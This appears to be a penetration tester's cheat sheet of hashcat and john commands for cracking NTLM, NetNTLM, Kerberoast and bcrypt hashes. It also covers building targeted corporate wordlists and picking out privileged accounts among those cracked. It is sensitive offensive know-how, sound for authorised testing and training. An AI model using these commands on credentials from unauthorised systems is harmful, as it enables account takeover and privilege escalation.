Credential cracking — hashcat / john
++++++++++++++++++++++++++++++++++++++++
hashid '<hash>'          # or name-that-hash — ID the mode before you burn GPU
# Modes you actually meet (source):
#   1000  NTLM (NTDS)              3000  LM
#   5500  NetNTLMv1 (Responder)    5600  NetNTLMv2 (Responder)
#   13100 Kerberoast (TGS)         18200 AS-REP
#   2100  DCC2/MSCache2            3200  bcrypt        full: hashcat.net/wiki/doku.php?id=example_hashes

# Attack modes (-O = optimized kernel, faster; caps password length):
hashcat -m 1000 -O hashes.txt /usr/share/wordlists/rockyou.txt              # -a 0 dictionary
hashcat -m 13100 -O kerb.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule  # dict + RULES
hashcat -m 1000 -O hashes.txt -a 3 ?u?l?l?l?l?l?d?d                         # -a 3 mask / brute
hashcat -m 5500 -O hashes.txt -a 6 wordlist.txt ?d?d?d?d                    # -a 6 hybrid word+mask
# Rules mutate the list (apple -> @ppl3/apple123); stack for reach:
#   best64.rule (fast)  OneRuleToRuleThemAll  NSAKEY/nsa-rules  nyxgeek-rules

# TARGETED wordlists beat raw rockyou on corporate passwords:
exrex "(Winter|Spring|Summer|Fall|Autumn)20(1[7-9]|2[0-9])" > seasons.txt    # Season+Year (2017–2029)
cupp -i                                                                       # OSINT-driven (names/dates/pets)
kwp basechars/full.base keymaps/en-us.keymap routes/2-to-10-max-3-direction-changes.route > kwalks.txt
# PACK: profile a real dump's masks, then crack within this org's policy:
statsgen ntds.txt -o org.masks && maskgen org.masks --optindex -o org.hcmask
hashcat -m 1000 -O ntds.txt -a 3 org.hcmask
# hate_crack chains dict -> rules -> mask automatically.

sort -u -t: -k1,1 responder.hashes > unique.hashes     # dedupe Responder hashes to one/user
# Kerberoast triage — which cracked SPN users are privileged?
cut -d'$' -f4 spns.txt | cut -d'*' -f2 > spn_users.txt
grep -wi -f spn_users.txt group-membership.txt | grep -i 'admin\|vpn\|server'
